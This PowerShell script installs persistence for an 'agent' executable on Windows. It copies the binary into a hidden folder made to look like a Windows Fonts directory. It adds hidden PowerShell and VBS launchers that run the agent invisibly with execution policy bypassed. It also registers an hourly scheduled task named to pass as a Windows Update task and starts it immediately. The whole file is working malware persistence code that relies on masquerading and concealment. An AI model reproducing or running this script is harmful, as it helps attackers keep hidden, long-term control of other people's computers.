$ProgressPreference = 'Continue'
$ErrorActionPreference = 'Stop'

# -------------------------------------------------------------------
# Function to get the agent path automatically (returns ONLY the path)
# -------------------------------------------------------------------
function Get-AgentPath {
    # 1. Try environment variable first
    if ($env:AgentPath -and (Test-Path $env:AgentPath)) {
        Write-Host "[+] Using AgentPath from environment: $env:AgentPath"
        return $env:AgentPath
    }

    # 2. Find parent process (the agent that launched this PowerShell)
    try {
        $parentPid = (Get-CimInstance -Class Win32_Process -Filter "ProcessId=$PID" | Select-Object -ExpandProperty ParentProcessId)
        if ($parentPid) {
            $parentPath = (Get-Process -Id $parentPid -ErrorAction Stop).Path
            if ($parentPath -and (Test-Path $parentPath)) {
                Write-Host "[+] Detected agent as parent process: $parentPath"
                return $parentPath
            }
        }
    } catch { }

    # 3. Search for a running process named "agent.exe"
    $proc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) {
        $procPath = $proc.Path
        if ($procPath -and (Test-Path $procPath)) {
            Write-Host "[+] Found running agent.exe at: $procPath"
            return $procPath
        }
    }

    # 4. Search common locations
    $commonPaths = @(
        "$env:TEMP\agent.exe",
        "$env:LOCALAPPDATA\Microsoft\Windows\Fonts\agent.exe",
        "$env:APPDATA\agent.exe"
    )
    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            Write-Host "[+] Found agent at common location: $path"
            return $path
        }
    }

    Write-Output "ERROR: Could not locate agent executable."
    exit 1
}

# -------------------------------------------------------------------
# Main persistence installation
# -------------------------------------------------------------------
$agentPath = Get-AgentPath
Write-Host "[+] Using agent: $agentPath"

# --- 1. Hidden folder ---
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Host "[+] Created hidden folder: $hideDir"
}

# --- 2. Copy agent using cmd.exe (bypasses PowerShell path issues) ---
$agentFile = "$hideDir\agent.exe"
if (Test-Path $agentFile) {
    Remove-Item -Path $agentFile -Force
}
& cmd.exe /c copy /Y "$agentPath" "$agentFile" 2>&1 | Out-Null
if (-not (Test-Path $agentFile)) {
    Write-Output "ERROR: Failed to copy agent to $agentFile"
    exit 1
}
attrib +h $agentFile
Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# --- 3. Launcher script ---
$launcherPath = "$hideDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$agentFile = '$agentFile'
Start-Process -WindowStyle Hidden -FilePath `$agentFile
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

# --- 4. VBS launcher ---
$vbsPath = "$hideDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# --- 5. Scheduled task: every 1 hour ---
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Host "✅ Scheduled task created (runs every 1 hour)."
    schtasks /run /tn $taskName 2>$null
    Write-Host "✅ Agent launched immediately."
} else {
    Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
    exit 1
}

Write-Host ""
Write-Host "✅ PERSISTENCE COMPLETE"
Write-Host "Agent location: $agentFile (hidden)"
Write-Host "Task: $taskName runs every hour"
